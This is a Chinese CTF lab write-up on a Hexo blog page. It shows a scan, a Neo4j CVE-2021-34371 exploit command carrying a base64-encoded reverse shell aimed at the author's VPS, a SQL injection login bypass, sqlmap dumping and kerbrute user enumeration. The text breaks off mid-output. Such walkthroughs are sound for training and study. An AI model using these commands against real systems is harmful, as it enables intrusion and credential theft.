@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="春秋云镜Time-wp" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            春秋云镜Time-wp
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%A4%96%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="post-toc-text">外网探测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Neo4j-3-4-18-rce"><span class="post-toc-text">Neo4j 3.4.18 rce</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag1"><span class="post-toc-text">flag1</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="post-toc-text">内网渗透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA"><span class="post-toc-text">扫描主机</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag2"><span class="post-toc-text">flag2</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Kerberos-AS-REP-Roasting%E6%94%BB%E5%87%BB"><span class="post-toc-text">Kerberos AS_REP Roasting攻击</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%94%A8Bloodhound%E8%BF%9B%E8%A1%8C%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="post-toc-text">用Bloodhound进行域信息收集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%A5%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="post-toc-text">通过自动登录注册表来抓取明文密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DCSync%E6%8A%93%E5%8F%96Hash"><span class="post-toc-text">DCSync抓取Hash</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Hash%E4%BC%A0%E9%80%92%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="post-toc-text">Hash传递获得管理员权限</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag3%E5%92%8Cflag4"><span class="post-toc-text">flag3和flag4</span></a></li></ol></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="外网探测"><a href="#外网探测" class="headerlink" title="外网探测"></a>外网探测</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用fscan进行扫描，不知道为什么用nmap扫不了。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">./fscan_386 -h 47.92.230.180 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 47.92.230.180   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">47.92.230.180:110 open</span></span><br><span class="line"><span class="string">47.92.230.180:25 open</span></span><br><span class="line"><span class="string">47.92.230.180:22 open</span></span><br><span class="line"><span class="string">47.92.230.180:7473 open</span></span><br><span class="line"><span class="string">47.92.230.180:7474 open</span></span><br><span class="line"><span class="string">47.92.230.180:7687 open</span></span><br><span class="line"><span class="string">47.92.230.180:45745 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 7</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">已完成 0/7 [-] webtitle https://47.92.230.180:45745 Get &quot;https://47.92.230.180:45745&quot;: EOF</span></span><br><span class="line"><span class="string">[*] WebTitle: http://47.92.230.180:7474 code:303 len:0      title:None 跳转url: http://47.92.230.180:7474/browser/</span></span><br><span class="line"><span class="string">[*] WebTitle: https://47.92.230.180:7687 code:400 len:50     title:None</span></span><br><span class="line"><span class="string">[*] WebTitle: http://47.92.230.180:7474/browser/ code:200 len:3279   title:Neo4j Browser</span></span><br><span class="line"><span class="string">[*] WebTitle: https://47.92.230.180:7473 code:303 len:0      title:None 跳转url: https://47.92.230.180:7473/browser/</span></span><br><span class="line"><span class="string">[*] WebTitle: https://47.92.230.180:7473/browser/ code:200 len:3279   title:Neo4j Browser</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Neo4j-3-4-18-rce"><a href="#Neo4j-3-4-18-rce" class="headerlink" title="Neo4j 3.4.18 rce"></a>Neo4j 3.4.18 rce</h2><p>发现有Neo4j的服务</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Neo4j?fromModule=lemma_inlink">Neo4j</a>是一个高性能的,NOSQL图形数据库，它将结构化数据存储在网络上而不是表中。它是一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B5%8C%E5%85%A5%E5%BC%8F/575465?fromModule=lemma_inlink">嵌入式</a>的、基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A3%81%E7%9B%98/2842227?fromModule=lemma_inlink">磁盘</a>的、具备完全的事务特性的Java持久化引擎，但是它将结构化数据存储在网络(从数学角度叫做图)上而不是表中。Neo4j也可以被看作是一个高性能的图引擎，该引擎具有成熟数据库的所有特性。程序员工作在一个面向对象的、灵活的网络结构下而不是严格、静态的表中——但是他们可以享受到具备完全的事务特性、企业级的数据库的所有好处。</p>
+</blockquote>
+<p>然后使用Neo4j的默认密码<code>neo4j/neo4j</code>登录，查看版本，找poc</p>
+<p>3.4.18版本</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131516530.png" title="image-20230413151650410" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131516530.png" alt="image-20230413151650410"></a></p>
+<p>刚好找到这个版本有一个rce漏洞<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-34371">CVE-2021-34371</a></p>
+<p>poc:<a target="_blank" rel="noopener" href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">CVE-2021-34371.jar</a>，poc需要使用java8来执行</p>
+<p>然后使用这个网站来编码命令：<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar <span class="string">&quot;D:\JAVAWEB\POC\CVE-2021-34371.jar-main\rhino_gadget.jar&quot;</span> rmi://39.98.205.105:1337 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTxxxxxxxxxxxxxxTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131613503.png" title="image-20230413161310432" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131613503.png" alt="image-20230413161310432"></a></p>
+<p>成功获得反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131614825.png" title="image-20230413161412793" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131614825.png" alt="image-20230413161412793"></a></p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>获得flag01: <code>flag&#123;5dfd9a5e-8fac-4ecd-b552-5302e8ab9fa6&#125;</code></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h2><p>他提示有Kerberos，先上传个fscan扫一下内网</p>
+<p>vps用python开启http服务，然后使用wget下载</p>
+<p>得到以下结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">[*] alive ports len is: 11</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] NetBios: 172.22.6.25     XIAORANG\WIN2019               </span><br><span class="line">[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:后台登录</span><br><span class="line">[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.6.12     [+]DC DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None</span><br></pre></td></tr></table></figure>
+
+<p>除了本机<code>172.22.6.25</code>，还存在另外几台主机</p>
+<ul>
+<li>172.22.6.12 域控</li>
+<li>172.22.6.38 存在web服务</li>
+<li>172.22.6.25 域内主机</li>
+</ul>
+<p>先查看web服务，使用frp搭建代理，流程省略，在我其他春秋的wp里有</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>访问web服务</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131622800.png" title="image-20230413162245711" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131622800.png" alt="image-20230413162245711"></a></p>
+<p>应该是个弱密码，抓包爆破一下【如果要抓包，就需要设置全局代理】</p>
+<p>没成功，试试sql注入</p>
+<p>使用万能密码<code>&#39; or 1=1 #</code>，可以拿到成功的回显</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131636311.png" title="image-20230413163630231" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131636311.png" alt="image-20230413163630231"></a></p>
+<p>但是这里是进不了后台的，所以可能需要盲注，这里就直接跑sqlmap了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -u http://172.22.6.38/index.php -method=POST --data=<span class="string">&quot;username=1&amp;password=2&quot;</span> -dump</span><br></pre></td></tr></table></figure>
+
+<p>拿到</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><ul>
+<li><p>flag2：<code>flag&#123;b142f5ce-d9b8-4b73-9012-ad75175ba029&#125; </code></p>
+</li>
+<li><p>网站的账户密码 administrator&#x2F;bo2y8kAL3HnXUiQo</p>
+</li>
+<li><p>oa的用户信息</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131647828.png" title="image-20230413164732786" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304131647828.png" alt="image-20230413164732786"></a></p>
+</li>
+</ul>
+<p>但是没有其他可以用的数据，尝试<code>-os-shell</code>拿shel，但是也没有成功，所以应该是没有其他的地方可以打了，看其他主机</p>
+<p>仔细回看flag1的提示，可能是考验我们对kerberos的认证过程，先枚举一下域用户</p>
+<h2 id="Kerberos-AS-REP-Roasting攻击"><a href="#Kerberos-AS-REP-Roasting攻击" class="headerlink" title="Kerberos AS_REP Roasting攻击"></a>Kerberos AS_REP Roasting攻击</h2><p>将上面数据库中的用户做成字典</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a>，需要上传到第一个主机来执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_386 userenum --dc 172.22.6.12 -d xiaorang.lab time.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 04/13/23 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2023/04/13 18:13:03 &gt;  Using KDC(s):</span><br><span class="line">2023/04/13 18:13:03 &gt;   172.22.6.12:88</span><br><span class="line"></span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weixian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wengbang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       xiqidi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       gaiyong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       shuzhen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yuanchang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       xuanjiang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       wenbo@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       lvhui@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jinqing@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhenjun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yangju@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weicheng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       weixian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       haobei@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jizhen@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jingze@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       rubao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       tangshun@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhaoxiu@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       liangliang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       qiyue@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chouqian@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jicheng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       xiyi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chenghui@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       beijin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       chebin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       pengyuan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yanglang@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       jihuan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       duanmuxiao@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       hongzhi@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       gaijin@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       yifu@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       fusong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       luwan@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       tangrong@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID USERNAME:       zhufeng@xiaorang.lab</span><br><span class="line">2023/04/13 18:13:03 &gt;  [+] VALID 